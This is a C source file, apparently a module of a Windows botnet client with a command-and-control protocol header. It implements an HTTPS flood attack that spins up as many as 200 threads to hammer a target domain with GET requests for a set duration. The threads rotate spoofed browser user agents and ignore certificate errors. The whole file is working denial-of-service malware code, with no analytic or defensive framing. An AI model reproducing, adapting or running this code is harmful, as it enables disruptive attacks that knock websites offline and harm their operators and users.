#include "headers/includes.h"
#include <wininet.h>
#include "headers/attacks.h"
#include "headers/rand.h"
#include "headers/cnc_protocol.h"

char *user_agents[] = {
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:120.0) Gecko/20100101 Firefox/120.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.92 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edg/118.0.2088.76",
    "Mozilla/5.0 (Windows NT 10.0; rv:119.0) Gecko/20100101 Firefox/119.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.85 Safari/537.36"
};

struct https_thread_data {
    char host[256];
    char path[1024];
    int duration;
};

DWORD WINAPI https_worker(LPVOID arg) {
    struct https_thread_data *data = (struct https_thread_data *)arg;
    HINTERNET hInternet, hConnect, hRequest;
    DWORD startTime = GetTickCount();

    PRINTF("[https_worker] Thread started for %s\n", data->host);

    hInternet = InternetOpenA(user_agents[rand_next() % 10], INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) {
        PRINTF("[https_worker] InternetOpenA failed: %lu\n", GetLastError());
        return 0;
    }

    while (GetTickCount() - startTime < (DWORD)(data->duration * 1000)) {
        hConnect = InternetConnectA(hInternet, data->host, INTERNET_DEFAULT_HTTPS_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
        if (hConnect) {
            hRequest = HttpOpenRequestA(hConnect, "GET", data->path, NULL, NULL, NULL,
                INTERNET_FLAG_RELOAD | INTERNET_FLAG_SECURE | INTERNET_FLAG_IGNORE_CERT_CN_INVALID | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID | INTERNET_FLAG_NO_CACHE_WRITE, 0);

            if (hRequest) {
                char headers[] = "Connection: keep-alive\r\n"
                               "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n";

                HttpAddRequestHeadersA(hRequest, headers, (DWORD)-1, HTTP_ADDREQ_FLAG_ADD | HTTP_ADDREQ_FLAG_REPLACE);

                if (HttpSendRequestA(hRequest, NULL, 0, NULL, 0)) {
                } else {
                }
                InternetCloseHandle(hRequest);
            }
            InternetCloseHandle(hConnect);
        } else {
            PRINTF("[https_worker] Connect failed: %lu\n", GetLastError());
            Sleep(100);
        }

        Sleep(5);
    }

    InternetCloseHandle(hInternet);
    PRINTF("[https_worker] Thread finished\n");
    return 0;
}

void attack_app_https(char *domain, int duration, struct attack_option *opts, uint8_t opts_len) {
    if (domain == NULL || util_strlen(domain) == 0) {
        PRINTF("[https] Error: Domain is empty or NULL\n");
        return;
    }

    if (duration <= 0) duration = 10;

    PRINTF("[https] Attack starting: %s for %ds\n", domain, duration);

    static struct https_thread_data data;
    util_zero(&data, sizeof(struct https_thread_data));
    data.duration = duration;

    if (util_strstr(domain, "https://") == domain) {
        char *p = domain + 8;
        char *slash = util_strchr(p, '/');
        if (slash) {
            int hostLen = slash - p;
            if (hostLen > 255) hostLen = 255;
            util_memcpy(data.host, p, hostLen);
            data.host[hostLen] = '\0';
            util_strncpy(data.path, slash, 1023);
        } else {
            util_strncpy(data.host, p, 255);
            util_strncpy(data.path, "/", 1023);
        }
    } else {
        util_strncpy(data.host, domain, 255);
        util_strncpy(data.path, "/", 1023);
    }

    int conns = attack_get_opt_int(opts_len, opts, ATK_OPT_CONNS, 1);
    if (conns > 200) conns = 200;
    if (conns <= 0) conns = 1;

    PRINTF("[https] Resolved Target: %s, Path: %s, Threads: %d\n", data.host, data.path, conns);

    HANDLE threads[200];
    util_zero(threads, sizeof(threads));
    int created = 0;

    for (int i = 0; i < conns; i++) {
        threads[i] = CreateThread(NULL, 0, https_worker, &data, 0, NULL);
        if (threads[i] != NULL) {
            created++;
        } else {
            PRINTF("[https] Error creating thread %d: %lu\n", i, GetLastError());
        }
    }

    if (created > 0) {
        PRINTF("[https] %d threads are now running. Waiting...\n", created);
        for(int j = 0; j < duration; j++) {
            if (j % 5 == 0) PRINTF("[https] Attack in progress... (%ds left)\n", duration - j);
            Sleep(1000);
        }
    } else {
        PRINTF("[https] Error: No threads could be started\n");
    }

    PRINTF("[https] Attack finished, closing thread handles.\n");
    for (int i = 0; i < 200; i++) {
        if (threads[i] != NULL) {
            CloseHandle(threads[i]);
        }
    }
}
